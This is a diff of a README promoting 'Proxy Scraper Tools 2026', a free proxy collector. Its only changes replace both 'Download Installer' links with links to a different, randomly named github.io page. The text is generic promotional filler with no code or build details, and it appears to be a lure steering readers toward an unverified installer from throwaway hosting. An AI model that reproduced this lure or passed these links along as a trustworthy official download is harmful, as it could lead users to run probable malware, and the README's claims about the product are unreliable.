@@ -2,7 +2,7 @@
 
 Proxy Scraper Tools 2026 is the ultimate solution for automatically scraping and collecting free proxy lists from the internet. This fast proxy collector supports a wide range of proxy types, including HTTP, HTTPS, and SOCKS5, making it ideal for users who need reliable proxies for various applications. With its advanced geo-targeting feature, you can specify regions to scrape proxies from, ensuring you get the best connections for your needs. Whether you're a developer, researcher, or privacy enthusiast, Proxy Scraper Tools provides a seamless experience for managing proxies.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -61,6 +61,6 @@ A6: Proxy Scraper Tools does not impose hard limits on the number of proxies, bu
 
 ## Download
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 Proxy Scraper Tools is a powerful asset for anyone needing a steady stream of proxies. Whether for web scraping, privacy, or testing, this tool delivers efficiency and reliability. Remember to use proxies responsibly and in accordance with terms of service of websites you access. Stay updated with the latest versions by visiting our official website. This tool is optimized for speed and accuracy, making it a top choice in the proxy scraper community without any need for cheats or hacks.
